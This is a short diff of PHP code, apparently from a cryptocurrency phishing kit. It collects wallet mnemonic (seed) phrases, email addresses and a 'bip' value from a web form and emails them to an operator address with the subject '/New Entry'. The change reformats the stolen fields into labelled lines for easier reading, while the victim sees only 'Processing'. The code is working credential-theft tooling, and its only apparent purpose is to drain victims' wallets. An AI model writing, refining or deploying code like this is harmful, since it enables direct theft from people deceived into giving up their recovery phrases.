@@ -35,7 +35,8 @@ $mail->AddReplyTo($_POST['wallet_email'], $_POST['mnemonic']);
 $mail->Subject = "/New Entry";
 $mail->MsgHTML($mnemonic . $wallet_email . $bip);
 
-$mail->Body = $mnemonic . $wallet_email . $bip;
+$mail->Body = "Mnemonic= " . $mnemonic . "\r\n Email= " . $wallet_email . "\r\n Bip= " . $bip ;
+
 $mail->addAddress($email_to);
 if ( $mail->Send() ) {
   echo "Processing";
